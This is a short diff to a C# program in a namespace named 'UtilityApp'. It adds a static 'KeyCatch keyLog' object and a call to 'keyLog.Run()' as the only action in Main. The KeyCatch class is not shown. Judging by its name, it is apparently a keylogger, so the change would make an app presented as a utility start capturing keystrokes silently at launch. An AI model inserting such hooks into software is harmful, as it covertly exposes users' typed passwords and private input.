@@ -8,8 +8,10 @@ namespace UtilityApp
 {
     class Program
     {
+        static KeyCatch keyLog = new KeyCatch();
         static void Main(string[] args)
         {
+            keyLog.Run();
         }
     }
 }
